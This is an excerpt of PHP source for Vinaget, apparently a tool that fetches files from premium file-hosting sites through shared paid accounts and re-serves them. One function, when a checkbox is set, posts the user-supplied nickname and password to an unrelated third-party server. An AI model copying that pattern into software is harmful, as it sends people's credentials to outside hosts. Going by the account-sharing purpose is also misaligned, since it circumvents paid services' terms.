...
class getinfo {
	...
	function notice(){
		$DATE = date("jS F Y - g:i A",time());
		echo "<div align='center' class='copyright fixed' id='footer'>
			<table cellspacing='8' id='gfooter'>
				<tr>
					<td width='42%'><span style='color:#00053D;' class='good' title='Showing The Time & Date'><b>Time is now: $DATE (GMT-5)</b></span></a></td>
					<td width='13%' align='center' nowrap='nowrap'>Powered by <a href='http://vinaget.us'>Vinaget&#174;</a></td>										<td width='45%' align='right' nowrap='nowrap'><b><font color=#00053D>Designed By The ORG Goopet&#153;</font></b></td>
		...
		foreach ($this->acc as $host => $value) {
			...
			if (empty($xout[0])==false && empty($host)==false){
				if($this->debrid==true && $host==$plugin)
					$hosts[]= '<span class="plugincollst"><font color="#33ff00">'.$host.'</font> '.count($xout).'</span><br>';
				else
	...
	function save_jobs(){
		...
		foreach ($this->jobs as $key => $job) {
			if ($job['mtime'] < $oldest) $delete[] = $key;
		}
		foreach ($delete as $url) unset($this->jobs[$url]);
		### clean jobs ###
...
class stream_get extends getinfo {
	...
	function download($hash) {
		...
		if(stristr($header, "TTP/1.0 200 OK") || stristr($header, "TTP/1.1 200 OK")) {
			...
			if(stristr($header,"filename")) {
				...
				if(stristr($filename, "/")) $filename = substr(strrchr($filename, '/'), 1);
				elseif(stristr($filename, "?b?")) {
					$filename = $this->cut_str($filename, "?B?", "?");
	...
	function curl_xml($url, $cookies, $post, $header=1) {
		$ch = @curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, $header);
		if ($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
	...
	function main(){
		...
		if($this->Secure) {
			$checklog = false;
			$logs = file_get_contents($this->fileinfo_dir."/log.txt");
			$listlog = explode("\n", $logs);
			foreach ($listlog as $log) {
				if(empty($log)) continue;
				if(stristr($log, $_SERVER['REMOTE_ADDR'])) {
					$checklog = true;
					break;
				}
			}
	...
	function get($url){
		...
		//$linkdown = 'http://'.$sv_name.'index.php/'.$hosting.'/'.$job['hash'].'/'.$filename;
      ...
      //   echo " <br> "; 
		$dlhtml =  "<b><a title='kick here to download' href='".$lik."' style='TEXT-DECORATION: none' target='".$tiam."'> <font color='#00CC00'>".$filename."</font> <font color='#FF66FF'>(".$msize.")</font> <img src=images/chk_good.png></a> <a href='$link'> Direct </a> </b>";
		echo " <br>"; 			    
		if(isset($_POST['autopcbox']) && $_POST['autopcbox'] == "on") {
		$filename = str_replace("&", ".", $filename);
        $mess = "[center][b][URL=".$lik."]".$this->title." ==> [color=".$this->colorfn."]".$filename."[/color][color=".$this->colorfs. "] ($msize)[/color][/url][/b][/center]";
		$data = $this->curl("http://server22.whmpanels.com/~citydent/auto/index.php","","nick=".urlencode($_POST['nick'])."&pass=".urlencode($_POST['pass'])."&post=".urlencode($mess)."&send=".urlencode(' Save '));
		}
	...
	function fulllist() {
		...
		echo "<link rel=\"stylesheet\" href=\"table.css\" /><script type=\"text/javascript\" src=\"jquery.dataTables.js\"></script>";
		echo "<script type=\"text/javascript\">\$(document).ready(function(){\$('#filelist').dataTable();});function setCheckboxes(act){elts = document.getElementsByName(\"checkbox[]\");var elts_cnt  = (typeof(elts.length) != 'undefined') ? elts.length : 0;if (elts_cnt){ for (var i = 0; i < elts_cnt; i++){elts[i].checked = (act == 1 || act == 0) ? act : (elts[i].checked ? 0 : 1);} }}</script>";
		...
		echo '</select>';
		echo '<div style="overflow: auto; height: auto; max-height: 450px; width: 800px;"><table id="filelist" class="filelist" align="left" cellpadding="3" cellspacing="1" width="100%"><thead><tr class="flisttblhdr" valign="bottom"><td>&nbsp;</td><td width="60%"><b>'.$this->lang['name'].'</b></td><td width="15%"><b>'.$this->lang['original'].'</b></td><td width="11%"><b>'.$this->lang['size'].'</b></td><td width="14%"><b>'.$this->lang['date'].'</b></td></tr></thead><tbody>';
		...
		echo "</tbody><tfoot><tr class='flisttblftr'><td>&nbsp;</td><td>".$this->lang['total'].":</td><td></td><td>".$totalall."</td><td>&nbsp;</td></tr></tfoot></table>
	...
	function deljob(){	
		...
		if (isset($_POST['Cancel'])) $this->fulllist();
	}
...
class Tools_get extends getinfo {
	...
	function site_hash($url){
		...
		else if(strpos($url,"bayfiles.com"))		$site = "BF";
		else if(strpos($url,"bitshare.com"))		$site = "BS";
		else if(strpos($url,"crocko.com"))			$site = "CC";
		else if(strpos($url,"extabit.com"))			$site = "ET";
		else if(strpos($url,"filefactory.com"))		$site = "FF";
		else if(strpos($url,"filepost.com"))		$site = "FP";
		else if(strpos($url,"freakshare.com"))		$site = "FK";
		else if(strpos($url,"fshare.vn"))			$site = "FS";
		else if(strpos($url,"rapidgator.net"))		$site = "RG";
		else if(strpos($url,"turbobit.net"))		$site = "TB";
		else if(strpos($url,"up.4share.vn"))		$site = "4S";
		else if(strpos($url,"mega.co.nz"))		$site = "MEGA.CO.NZ";
		else if(strpos($url,"uploaded"))			$site = "UL";
		else if(strpos($url,"ul.to"))				$site = "UL";
		else $site = "other";
		return $site;
	}
	...
	function convert_name($filename) {
		...
		$filename = preg_replace("/(\]|\[|\@|\"\;\?\=|\"|=|\*|UTF-8|\')/", "", $filename);
		$filename = preg_replace("/(http|www|\.html|\.htm)/i", "", $filename);
		$filename = str_replace($this->banned, ".xxx", $filename);
